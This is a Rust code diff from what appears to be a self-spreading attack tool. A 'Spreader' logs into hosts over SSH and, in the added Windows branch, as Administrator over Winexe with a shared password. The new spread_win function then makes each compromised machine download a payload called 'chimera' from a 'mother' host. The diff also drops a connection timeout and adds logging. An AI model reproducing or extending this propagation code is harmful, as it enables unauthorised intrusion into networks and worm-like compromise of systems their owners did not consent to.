@@ -78,15 +78,16 @@ impl ConnectionPool {
             let host_arc_clone = host.clone();
 
             let future = async move {
-                let task_timeout = Duration::from_secs(15);
-                match timeout(
-                    task_timeout,
-                    establish_connection(host_arc_clone, shared_pass),
-                )
-                .await
+                //let task_timeout = Duration::from_secs(15);
+                //match timeout(
+                //    task_timeout,
+                //    establish_connection(host_arc_clone, shared_pass),
+                //)
+                //.await
+                match establish_connection(host_arc_clone, shared_pass).await
                 {
-                    Ok(Some(connection)) => Some(connection),
-                    Ok(None) | Err(_) => {
+                    Some(connection) => Some(connection),
+                    None => {
                         println!("Connection to {} failed or timed out", host.ip);
                         None
                     }
@@ -109,6 +110,7 @@ impl ConnectionPool {
         self.clients
             .retain(|client| !ips.contains(&client.1.get_ip().to_string()));
         println!("Removed {} clients", ips.len());
+        println!("clients removed: {:?}", ips);
     }
 }
 
@@ -158,6 +160,37 @@ async fn establish_connection(
                 Ok(Ok(session)) => {
                     println!("WE GOT A SESSION on ip {}", host.ip);
                     Arc::new((host.os, SessionType::SSH(session)))
+                }
+                Ok(Err(e)) => {
+                    println!("Error on {}: {}", host.ip, e);
+                    return None;
+                }
+                Err(_) => {
+                    println!("Connection to {} timed out", host.ip);
+                    return None;
+                }
+            };
+
+            Some(session)
+        }
+        OS::Windows => {
+            let creds = Credentials {
+                username: "Administrator".into(),
+                password: Some(password.to_string()),
+                key: None,
+            };
+            println!("Trying to connect to {}", host.ip);
+
+            let mut client = WinexeClient::new(); // Initialize the client here without 'let'
+            client.ip(host.ip.as_str());
+            client.container_path("/tmp/".into());
+
+            let timeout_duration = Duration::from_secs(25);
+
+            let session = match timeout(timeout_duration, client.connect(&creds)).await {
+                Ok(Ok(session)) => {
+                    println!("WE GOT A SESSION on ip {}", host.ip);
+                    Arc::new((host.os, SessionType::Winexe(session)))
                 }
                 Ok(Err(e)) => {
                     println!("Error on {}: {}", host.ip, e);
@@ -241,6 +274,18 @@ impl Spreader {
                             }
                         };
                     }
+                    OS::Windows => {
+                        match Self::spread_win(&local_mother_ip, &shared_client.1).await {
+                            Ok(_) => println!("Successfully spread"),
+                            Err(e) => {
+                                println!("Error spreading: {}", e);
+                                shared_failed_clients
+                                    .lock()
+                                    .await
+                                    .push(shared_client.1.get_ip().to_string());
+                            }
+                        };
+                    }
                     _ => {}
                 }
             };
@@ -252,6 +297,17 @@ impl Spreader {
         join_all(futures).await;
 
         self.pool.remove_many(failed_clients.lock().await.clone());
+    }
+
+    async fn spread_win(mother_ip: &str, session: &SessionType) -> anyhow::Result<()> {
+        let session = match session {
+            SessionType::Winexe(session) => session,
+            // Throw an error if the session is not Windows
+            _ => return Err(anyhow!("Session is not Windows")),
+        };
+
+        session.download_chimera(mother_ip).await?;
+        Ok(())
     }
 
     async fn spread_unix(mother_ip: &str, session: &SessionType) -> anyhow::Result<()> {
